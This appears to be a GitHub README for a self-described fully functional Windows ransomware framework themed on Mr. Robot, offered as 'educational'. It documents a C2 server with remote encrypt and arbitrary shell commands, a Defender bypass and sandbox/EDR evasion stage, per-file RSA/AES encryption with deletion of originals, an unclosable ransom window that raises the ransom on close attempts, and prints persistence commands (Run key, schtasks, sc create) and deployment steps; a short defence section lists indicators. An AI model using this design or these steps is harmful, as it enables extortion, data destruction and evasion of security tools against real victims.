# MrRobot - Quantum Ransomware Framework

<div align="center">

**Advanced Ransomware Research & Educational Framework**

[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
[![License](https://img.shields.io/badge/License-Educational%20Only-red.svg)](LICENSE)
[![Security](https://img.shields.io/badge/⚠️-Research%20Only-critical.svg)](DISCLAIMER.md)

*"Sometimes I dream of saving the world..."* - Elliot Alderson

</div>

---

## ⚠️ CRITICAL DISCLAIMER

**THIS PROJECT IS STRICTLY FOR EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH ONLY**

This is a **fully functional ransomware framework** designed to demonstrate advanced malware techniques for cybersecurity education and defensive research.

### ⛔ Legal Warning

- **UNAUTHORIZED USE IS ILLEGAL** and may violate federal, state, and international laws
- **DO NOT** deploy on systems you do not own or have explicit written authorization to test
- **DO NOT** use for malicious purposes under any circumstances
- The authors assume **ZERO LIABILITY** for misuse or damage
- This software is provided **AS-IS** for **controlled lab environments ONLY**

### ✅ Authorized Use Cases

- Academic cybersecurity research in isolated environments
- Malware analysis training in sandboxed VMs
- Red team exercises with proper authorization
- Defensive security tool development and testing

---

## 📋 Table of Contents

- [Overview](#overview)
- [Key Features](#key-features)
- [Architecture](#architecture)
- [Project Structure](#project-structure)
- [Installation](#installation)
- [Usage Guide](#usage-guide)
- [Technical Deep Dive](#technical-deep-dive)
- [Security Research](#security-research)
- [Defense Strategies](#defense-strategies)
- [Contributing](#contributing)
- [References](#references)

---

## 🎯 Overview

**MrRobot Quantum Ransomware Framework** is a sophisticated, production-grade ransomware simulation implementing cutting-edge malware techniques. This framework demonstrates the complete attack lifecycle from initial compromise to data encryption and ransom negotiation.

### What Makes This Framework Unique

- **Complete C2 Infrastructure**: Full command-and-control server with victim management
- **Hybrid Encryption**: Military-grade RSA-2048 + AES-256 encryption
- **Advanced Evasion**: Multi-layered antivirus and sandbox bypass techniques
- **Persistent Interface**: Unkillable GUI with psychological pressure tactics
- **Database Management**: SQLite-based victim tracking and key management
- **Real-World Simulation**: Implements actual ransomware behaviors and techniques

---

## ✨ Key Features

### 🔴 Attacker Components (`attack.py`)

**Quantum Attacker v4.4** - Complete C2 Server

- **Victim Management System**
  - SQLite database for victim tracking (`victims.db`)
  - Unique victim ID generation with IP tracking
  - Encrypted file count monitoring
  - Victim status dashboard

- **RSA Key Management**
  - Automated RSA-2048 key pair generation
  - Per-victim key isolation
  - Secure key storage and retrieval
  - Key export functionality

- **Command & Control Server**
  - Multi-threaded victim handling
  - JSON-based encrypted communication
  - Real-time victim status monitoring
  - Interactive command interface

- **Remote Operations**
  - `encrypt` - Trigger file encryption on victim
  - `decrypt` - Decrypt files with private key
  - `scan` - Enumerate files on victim system
  - `status` - Get victim system information
  - `shell` - Execute arbitrary commands
  - `disconnect` - Cleanly disconnect victim

### 🔵 Victim Components

#### **1. Main Orchestrator (`main.py`)**
Automated compromise sequence with two-stage execution:

- **Stage 1**: Windows Defender kernel-level bypass
- **Stage 2**: Quantum Victim client deployment
- Dependency auto-installation
- Administrator privilege checking
- Execution monitoring and recovery

#### **2. Core Victim Client (`victim.py`)**
**Quantum Victim v4.1** - Complete ransomware payload

- **Hybrid Encryption Engine**
  - RSA-2048 public key encryption
  - AES-256-CTR per-file encryption
  - Unique AES key per file
  - Secure key wrapping with PKCS1_OAEP
  - Fallback XOR encryption if crypto unavailable

- **File Operations**
  - Recursive directory scanning
  - Configurable file extension targeting
  - `.MrRobot` encrypted file extension
  - Secure original file deletion
  - Integrity verification

- **C2 Communication**
  - Persistent connection with retry logic
  - JSON protocol with length prefixing
  - Socket health monitoring
  - Automatic reconnection
  - Command execution loop

- **Visual Impact**
  - Wallpaper replacement
  - Task Manager disabling
  - Ransom interface launching
  - Desktop warning creation

#### **3. Ransom Interface (`interface_integration.py`)**
**Persistent Edition** - Unkillable GUI with psychological warfare

- **Window Persistence**
  - Disabled close button
  - Always-on-top enforcement
  - Anti-minimize protection
  - Window message hooking
  - Automatic restart on termination

- **Psychological Pressure**
  - Countdown timer (72 hours)
  - Increasing ransom amount on close attempts
  - Error sounds and visual warnings
  - Desktop warning file creation
  - Close attempt logging

- **User Interface**
  - Mr. Robot themed design
  - Bitcoin payment instructions
  - QR code generation
  - File count display
  - Background music (Mr. Robot theme)
  - Glitch effects and animations

- **Anti-Tampering**
  - Process monitoring
  - Window state restoration
  - Heartbeat mechanism
  - Multiple protection layers

#### **4. Antivirus Bypass (`Antivirus_bp.py`)**
Comprehensive multi-layered evasion framework

- **Static Evasion**
  - Polymorphic code generation
  - Import Address Table (IAT) bypass
  - Entropy manipulation
  - Signature avoidance

- **Dynamic Evasion**
  - Sandbox detection (VM, debugger, analysis tools)
  - API hook bypass via direct syscalls
  - Sleep bombs and timing checks
  - Behavioral analysis evasion

- **Advanced Techniques**
  - Memory analysis bypass
  - Anti-dumping protection
  - Protected memory allocation
  - Execution continuity assurance

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                     ATTACKER INFRASTRUCTURE                     │
│                      (Quantum Attacker v4.4)                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌────────────────┐  ┌──────────────┐  ┌──────────────────┐   │
│  │  C2 Server     │  │  Key Manager │  │  Victim Database │   │
│  │  (Port 5555)   │◄─┤  (RSA-2048)  │◄─┤   (SQLite)       │   │
│  └────────┬───────┘  └──────────────┘  └──────────────────┘   │
│           │                                                     │
│           │  Commands: encrypt, decrypt, scan, status, shell   │
│           │  Protocol: JSON over TCP with length prefix        │
└───────────┼─────────────────────────────────────────────────────┘
            │
            │ Encrypted C2 Channel
            │
            ▼
┌─────────────────────────────────────────────────────────────────┐
│                       VICTIM SYSTEM                             │
│                   (Quantum Victim v4.1)                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │              STAGE 1: System Compromise                  │  │
│  │  ┌────────────────┐         ┌────────────────────────┐  │  │
│  │  │  main.py       │────────►│  Antivirus_bp.py       │  │  │
│  │  │  Orchestrator  │         │  Multi-layer Evasion   │  │  │
│  │  └────────────────┘         └────────────────────────┘  │  │
│  └──────────────────────────────────────────────────────────┘  │
│                            │                                    │
│                            ▼                                    │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │              STAGE 2: Payload Execution                  │  │
│  │  ┌────────────────┐         ┌────────────────────────┐  │  │
│  │  │  victim.py     │────────►│  Encryption Engine     │  │  │
│  │  │  C2 Client     │         │  RSA-2048 + AES-256    │  │  │
│  │  └────────┬───────┘         └────────────────────────┘  │  │
│  │           │                                              │  │
│  │           ▼                                              │  │
│  │  ┌────────────────────────────────────────────────────┐ │  │
│  │  │         interface_integration.py                   │ │  │
│  │  │         Persistent Ransom Interface                │ │  │
│  │  │  • Unkillable Window  • Countdown Timer            │ │  │
│  │  │  • Bitcoin Payment    • Psychological Pressure     │ │  │
│  │  └────────────────────────────────────────────────────┘ │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
│  Encrypted Files: *.MrRobot                                    │
│  Persistence: Registry, Startup, Scheduled Tasks               │
└─────────────────────────────────────────────────────────────────┘
```

---

## 📁 Project Structure

```
MrRobot/
│
├── Attacker/
│   └── last version/
│       └── attack.py                    # [42KB] Complete C2 server with victim management
│
├── Victim/
│   └── last version/
│       ├── main.py                      # [6.6KB] Main orchestrator - 2-stage execution
│       ├── victim.py                    # [54KB] Core ransomware client
│       ├── interface_integration.py     # [40KB] Persistent ransom GUI
│       ├── Antivirus_bp.py             # [12KB] Multi-layer evasion framework
│       ├── REQUIREMENTS.txt             # [2.5KB] Python dependencies
│       ├── installer.bash               # Bash installation script
│       ├── win10_activate.ps1          # PowerShell activation script
│       ├── mrrobot2.png                # [1.9MB] Interface background image
│       ├── mrrobot_inter.png           # [2.0MB] Alternative interface image
│       └── mrrobot_sound.mp3           # [4.2MB] Mr. Robot theme audio
│
├── Incompleted files/                   # Work in progress components
├── malware_project-report.pdf          # [758KB] Detailed technical documentation
├── showing_the_instialization_part.txt # Demo video link
└── README.md                            # This file
```

---

## 🚀 Installation

### Prerequisites

- **Operating System**: Windows 10/11 (for full feature support)
- **Python**: 3.8 or higher
- **Privileges**: Administrator rights (for bypass features)
- **Environment**: Isolated VM or sandbox (MANDATORY)

### Required Dependencies

```bash
# Core cryptography
pip install pycryptodome>=3.17.0
pip install cryptography>=41.0.0
pip install rsa>=4.9

# GUI and interface
pip install pillow>=10.0.0
pip install pygame>=2.5.0
pip install qrcode>=7.4

# System interaction
pip install psutil>=5.9.0
pip install pywin32>=306

# Network and data
pip install requests>=2.31.0
pip install urllib3>=2.0.0

# Terminal UI
pip install colorama>=0.4.6
pip install windows-curses>=2.3.0

# Optional: Compilation
pip install pyinstaller>=5.13.0
pip install nuitka>=1.7
```

### Quick Installation

```bash
# Navigate to victim directory
cd "c:\Users\AYOUB\Downloads\MrRobot\Victim\last version"

# Install all dependencies
pip install -r REQUIREMENTS.txt
```

### ⚠️ CRITICAL: Isolated Environment Setup

**NEVER run this on a production system!**

1. **Create a Virtual Machine**:
   - Use VMware, VirtualBox, or Hyper-V
   - Snapshot before testing
   - Disable network bridging (use NAT)
   - Disable shared folders

2. **Network Isolation**:
   - Create isolated virtual network
   - No internet access for victim VM
   - Attacker and victim on same virtual network

3. **Backup Everything**:
   - Snapshot VM before execution
   - Backup any test files
   - Document all changes

---

## 💻 Usage Guide

### ⚠️ WARNING: CONTROLLED ENVIRONMENT ONLY!

### Attacker Setup

#### 1. Start the C2 Server

```bash
cd "c:\Users\AYOUB\Downloads\MrRobot\Attacker\last version"
python attack.py
```

**What happens**:
- Server starts on `0.0.0.0:5555`
- SQLite database `victims.db` is created
- Interactive command interface launches
- Waits for victim connections

#### 2. Attacker Command Interface

Once the server is running:

```
╔══════════════════════════════════════════════════════════╗
║           QUANTUM ATTACKER CONTROL PANEL                 ║
╚══════════════════════════════════════════════════════════╝

Available Commands:
  list                    - Show all connected victims
  encrypt <id> <path>     - Encrypt files on victim
  decrypt <id>            - Decrypt all files on victim
  scan <id> <path>        - Scan directory on victim
  status <id>             - Get victim system status
  shell <id> <command>    - Execute shell command
  keys <id>               - Show victim RSA keys
  export <id>             - Export keys to files
  disconnect <id>         - Disconnect victim
  help                    - Show this menu
  exit                    - Shutdown server
```

**Example workflow**:
```bash
# List connected victims
>>> list

# Scan victim's documents
>>> scan 1 C:\Users\Victim\Documents

# Encrypt the documents
>>> encrypt 1 C:\Users\Victim\Documents

# Check status
>>> status 1

# Later: decrypt files
>>> decrypt 1

# Export keys for offline decryption
>>> export 1
```

### Victim Deployment

#### Method 1: Automated Execution (Recommended)

```bash
cd "c:\Users\AYOUB\Downloads\MrRobot\Victim\last version"

# Run as Administrator
python main.py
```

**Execution sequence**:
1. ✅ Checks administrator privileges
2. ✅ Installs dependencies (psutil, pycryptodome)
3. ✅ **Stage 1**: Runs `Antivirus_bp.py` (Defender bypass)
4. ✅ **Stage 2**: Launches `victim.py` (ransomware client)
5. ✅ Connects to attacker C2 server
6. ⏳ Waits for commands

#### Method 2: Manual Execution

```bash
# Step 1: Run evasion first (optional)
python Antivirus_bp.py

# Step 2: Run victim client
python victim.py
```

#### 3. Victim Configuration

Edit `victim.py` to configure:

```python
# Line ~684: Set attacker IP and port
def __init__(self, attacker_ip='192.168.44.133', attacker_port=5555):
    self.attacker_ip = attacker_ip      # Change to your C2 IP
    self.attacker_port = attacker_port  # Change if needed
```

### Ransom Interface

When encryption is triggered:

1. **Persistent window appears** with Mr. Robot theme
2. **Countdown timer** starts (72 hours)
3. **Bitcoin payment instructions** displayed
4. **File count** shows encrypted files
5. **Close attempts** are blocked and punished:
   - Ransom amount increases
   - Error sounds play
   - Warning files created on desktop
   - Window automatically restores

### Decryption Process

#### From Attacker Console:

```bash
# Decrypt all files for victim ID 1
>>> decrypt 1
```

#### Manual Decryption:

```bash
# Export private key
>>> export 1

# On victim machine, use exported private key
python victim.py --decrypt --key private_key.pem
```

---

## 🔬 Technical Deep Dive

### Encryption Scheme

**Hybrid RSA + AES Encryption**

1. **Key Generation** (Attacker):
   ```
   RSA-2048 key pair generated per victim
   Public key embedded in victim payload
   Private key stored in attacker database
   ```

2. **File Encryption** (Victim):
   ```
   For each file:
     1. Generate random AES-256 key (32 bytes)
     2. Generate random nonce (8 bytes)
     3. Encrypt file with AES-256-CTR(key, nonce)
     4. Encrypt AES key with RSA-2048 public key (PKCS1_OAEP)
     5. Encrypt nonce with RSA-2048 public key (PKCS1_OAEP)
     6. Build custom file header
     7. Write: [Header][Encrypted AES Key][Encrypted Nonce][Encrypted Data]
     8. Rename to: original_name.MrRobot
     9. Securely delete original file
   ```

3. **File Header Format**:
   ```
   Offset | Size | Description
   -------|------|----------------------------------
   0x00   | 4    | Magic: "MRBT"
   0x04   | 2    | Version number
   0x06   | 2    | Flags
   0x08   | 4    | Encrypted AES key length
   0x0C   | 4    | Encrypted nonce length
   0x10   | 8    | Original file size
   0x18   | var  | RSA-encrypted AES key (256 bytes)
   var    | var  | RSA-encrypted nonce (256 bytes)
   var    | var  | AES-encrypted file data
   ```

### C2 Communication Protocol

**JSON over TCP with Length Prefix**

```python
# Message format
[4 bytes: message length (big-endian)][JSON payload]

# Example handshake
Client → Server:
{
    "type": "handshake",
    "victim_id": "a1b2c3d4e5f6",
    "hostname": "VICTIM-PC",
    "username": "victim_user",
    "os": "Windows 10"
}

Server → Client:
{
    "type": "handshake_ack",
    "public_key": "-----BEGIN RSA PUBLIC KEY-----\n..."
}

# Example encrypt command
Server → Client:
{
    "type": "encrypt",
    "location": "C:\\Users\\Victim\\Documents"
}

Client → Server:
{
    "type": "encrypt_response",
    "success": true,
    "files_encrypted": 583,
    "errors": []
}
```

### Evasion Techniques

#### Static Evasion
- **Polymorphic Code**: Runtime code generation to avoid signatures
- **IAT Bypass**: Manual DLL loading to hide imports
- **Entropy Manipulation**: Add random data to appear non-malicious

#### Dynamic Evasion
- **Sandbox Detection**:
  - VM detection (VMware, VirtualBox, QEMU)
  - Debugger detection (IsDebuggerPresent, CheckRemoteDebugger)
  - Analysis tool detection (Process Monitor, Wireshark, IDA)
  - Resource checks (CPU count, RAM, disk space)
  
- **API Hook Bypass**: Direct syscalls to avoid EDR hooks
- **Sleep Bombs**: Timing checks to evade automated analysis
- **Memory Protection**: Anti-dumping and anti-analysis

### Persistence Mechanisms

```python
# Registry Run Key
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Value: "MrRobot" = "C:\path\to\victim.exe"

# Startup Folder
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\

# Scheduled Task
schtasks /create /tn "MrRobot" /tr "C:\path\to\victim.exe" /sc onlogon

# Windows Service (requires admin)
sc create MrRobot binPath= "C:\path\to\victim.exe" start= auto
```

---

## 🛡️ Security Research

### Learning Objectives

1. **Understand Ransomware Operations**:
   - Encryption mechanisms
   - C2 communication
   - Persistence techniques
   - Evasion strategies

2. **Develop Detection Capabilities**:
   - Behavioral analysis
   - Network traffic patterns
   - File system monitoring
   - Registry changes

3. **Build Defensive Tools**:
   - Ransomware detection signatures
   - Behavioral blocking rules
   - Network-based detection
   - Endpoint protection

### Research Applications

- **Malware Analysis Training**: Hands-on experience with real techniques
- **SOC Analyst Training**: Incident detection and response
- **Red Team Exercises**: Authorized penetration testing
- **Blue Team Defense**: Developing countermeasures
- **Academic Research**: Cybersecurity education

---

## 🛡️ Defense Strategies

### Detection Indicators

#### Network Indicators
```
- Outbound connection to port 5555
- JSON-based C2 traffic
- Periodic heartbeat packets
- Large data transfers (file enumeration)
```

#### File System Indicators
```
- Files with .MrRobot extension
- Ransom notes on desktop
- interface_integration.py creation
- wallpaper.py creation
- Rapid file modifications
```

#### Registry Indicators
```
- HKCU\Software\Microsoft\Windows\CurrentVersion\Run modifications
- Task Manager disable registry keys
- Wallpaper change registry keys
```

#### Process Indicators
```
- Python.exe with network connections
- Tkinter GUI processes
- High CPU usage during encryption
- Multiple file handle operations
```

### Prevention Strategies

1. **Endpoint Protection**:
   - Enable real-time antivirus
   - Use application whitelisting
   - Implement least privilege
   - Regular security updates

2. **Network Security**:
   - Monitor outbound connections
   - Block suspicious ports
   - Implement network segmentation
   - Use intrusion detection systems

3. **Backup Strategy**:
   - Regular automated backups
   - Offline backup storage
   - Test restoration procedures
   - Version control for critical files

4. **User Training**:
   - Phishing awareness
   - Safe browsing practices
   - Suspicious file identification
   - Incident reporting procedures

### Mitigation Tools

```python
# Example: Monitor for .MrRobot files
import os
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class RansomwareDetector(FileSystemEventHandler):
    def on_created(self, event):
        if event.src_path.endswith('.MrRobot'):
            print(f"[ALERT] Ransomware detected: {event.src_path}")
            # Trigger incident response
```

---

## 🤝 Contributing

This project is for educational purposes. Contributions that enhance learning are welcome:

### Contribution Guidelines

- **Documentation**: Improve explanations and comments
- **Detection**: Add detection signatures and rules
- **Defense**: Develop mitigation strategies
- **Analysis**: Provide technical analysis and reports
- **Education**: Create tutorials and learning materials

### What NOT to Contribute

- ❌ Features that increase harm potential
- ❌ Obfuscation to evade detection
- ❌ Exploits for unpatched vulnerabilities
- ❌ Techniques for malicious use

### How to Contribute

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/educational-enhancement`)
3. Document your changes thoroughly
4. Submit a pull request with detailed explanation
5. Ensure all contributions maintain educational focus

---
## 🖼️ Visual Preview (Victim Side)

Below are the visual components deployed on the victim's machine during the encryption phase:

<div align="center">
  <table style="border: none;">
    <tr>
      <td align="center">
        <strong>Persistent Ransom Interface</strong><br />
        <img src="Victim/last%20version/mrrobot2.webp" width="400" alt="Ransom Interface" /><br />
        <em>(interface_integration.py)</em>
      </td>
      <td align="center">
        <strong>Victim Desktop Wallpaper</strong><br />
        <img src="Victim/last%20version/wallpaper.png" width="400" alt="Victim Wallpaper" /><br />
        <em>(Automated System Takeover)</em>
      </td>
    </tr>
  </table>
</div>


## 📚 References

### Technical Documentation

- **Project Report**: `malware_project-report.pdf` - Comprehensive technical analysis
- **Demo Video**: See `showing_the_instialization_part.txt` for initialization demonstration

### Security Frameworks

- [MITRE ATT&CK](https://attack.mitre.org/) - Adversarial tactics and techniques
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

### Ransomware Research

- [No More Ransom Project](https://www.nomoreransom.org/)
- [CISA Ransomware Guide](https://www.cisa.gov/stopransomware)
- [Europol Ransomware Resources](https://www.europol.europa.eu/crime-areas-and-statistics/crime-areas/cybercrime)

### Cryptography

- [PyCryptodome Documentation](https://pycryptodome.readthedocs.io/)
- [RSA Encryption](https://en.wikipedia.org/wiki/RSA_(cryptosystem))
- [AES Encryption](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)

---

## 📄 License & Legal

### Educational Use Only

This software is provided **AS-IS** for **educational and authorized research purposes ONLY**.

### Terms of Use

- ✅ **Permitted**: Academic research, authorized security testing, malware analysis training
- ❌ **Prohibited**: Unauthorized deployment, malicious use, distribution without disclaimer
- ⚖️ **Liability**: Authors accept NO responsibility for misuse or damages
- 🔒 **Compliance**: Users must comply with all applicable laws and regulations

### Responsible Disclosure

If you discover vulnerabilities or improvements:
- Report security issues responsibly
- Do not exploit for malicious purposes
- Contribute defensive measures
- Support the cybersecurity community

---

## 🎓 Educational Context

### Inspired By

This project draws inspiration from the TV series **Mr. Robot**, which portrays realistic hacking scenarios and cybersecurity concepts. The framework is designed to help students and professionals understand the technical reality behind such scenarios.

### Learning Path

1. **Beginner**: Understand basic encryption and C2 communication
2. **Intermediate**: Analyze evasion techniques and persistence
3. **Advanced**: Develop detection and mitigation strategies
4. **Expert**: Build comprehensive defense frameworks

---

## 🔗 Contact & Support

### For Educational Inquiries

- **Issues**: Use GitHub Issues for bugs or questions
- **Security**: Report vulnerabilities responsibly
- **Research**: Contact for academic collaboration
- **Training**: Available for authorized security training

### Community

- Share defensive strategies
- Contribute detection signatures
- Develop mitigation tools
- Educate others responsibly

---

<div align="center">

## ⚡ Final Warning ⚡

**This is a REAL, FUNCTIONAL ransomware framework.**

**Use ONLY in isolated, controlled environments.**

**Unauthorized use is ILLEGAL and UNETHICAL.**

---

*"Sometimes I dream of saving the world. Saving everyone from the invisible hand... but I can't stop it. I'm not that special. I'm just anonymous. I'm just alone."*

**- Elliot Alderson, Mr. Robot**

---

### 🛡️ Use This Knowledge to DEFEND, Not to ATTACK 🛡️

**Stay Secure. Stay Ethical. Stay Legal.**

</div>



